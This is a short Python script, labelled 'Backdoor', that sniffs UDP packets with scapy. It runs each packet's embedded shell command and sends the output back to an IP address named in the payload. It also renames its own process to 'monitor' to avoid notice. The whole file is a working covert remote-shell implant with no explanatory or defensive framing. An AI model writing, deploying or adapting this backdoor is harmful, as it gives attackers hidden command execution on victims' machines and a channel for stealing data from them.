import argparse, setproctitle, subprocess
from scapy.all import *
from Crypto.Cipher import AES
from scapy.layers.inet import IP, UDP

parser = argparse.ArgumentParser(description="Backdoor")
# parser.add_argument('-d', '--server_ip', dest='server_ip', help='Server IP', required=True)
parser.add_argument('-p', '--server_port', dest='server_port', help='Server Port', required=True)
# parser.add_argument('-s', '--client_ip', dest='client_ip', help='Client IP', required=True)
parser.add_argument('-sp', '--client_port', dest='client_port', help='Client Port', required= True)
args = parser.parse_args()


def parse_command(packet):
    payload = packet['Raw'].load
    command = payload.split('#')[0]
    client_ip = payload.split('#')[1]
    proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output = proc.stdout.read()
    print (output)
    # pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(dport=int(args.client_port), sport=int(args.server_port)))
    pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(sport=int(args.server_port), dport=int(args.client_port))/output
    send(pkt)


def main():
    setproctitle.setproctitle("monitor")
    sniff(filter="udp and dst port " + args.server_port + " and src port " + args.client_port, prn=parse_command)

if __name__ == '__main__':
    main()